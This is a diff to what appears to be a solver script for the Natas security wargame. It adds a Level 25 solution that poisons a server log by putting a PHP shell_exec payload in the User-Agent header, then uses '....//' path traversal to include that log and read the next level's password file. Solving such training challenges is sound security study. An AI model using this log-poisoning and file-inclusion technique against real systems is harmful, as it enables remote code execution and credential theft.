@@ -560,6 +560,26 @@ try:
 except requests.exceptions.RequestException as e:
   print(f"HTTP Request failed: {e}")
 
+# Level 25
+try:
+  print("\nLevel 25")
+  print("Performing Log Poisoning Attack")
+  headers = {"User-Agent":'<?php echo shell_exec("cat /etc/natas_webpass/natas26"); ?>'}
+  payload1 = f"....//....//....//....//....//....//....//....///etc/natas_webpass/natas26"
+  params1 = {"lang":payload1}
+  response = requests.get(url_dict["natas25"],auth=cred_dict["natas25"],headers=headers,params=params1)
+  phpsessid = response.cookies["PHPSESSID"]
+  cookies = {"PHPSESSID": phpsessid}
+  payload2 = f"....//....//....//....//....//....//....//....///var/www/natas/natas25/logs/natas25_{phpsessid}.log"
+  params2 = {"lang":payload2}
+  response = requests.get(url_dict["natas25"],auth=cred_dict["natas25"],params=params2)
+  # Parse the response
+  soup = BeautifulSoup(response.text, "html.parser")
+  text_only = soup.get_text(separator=" ", strip=True)
+  print(text_only)
+  cred_dict["natas26"] = ("natas26",text_only.split()[6])
 
+except requests.exceptions.RequestException as e:
+  print(f"HTTP Request failed: {e}")
 
 print(cred_dict)
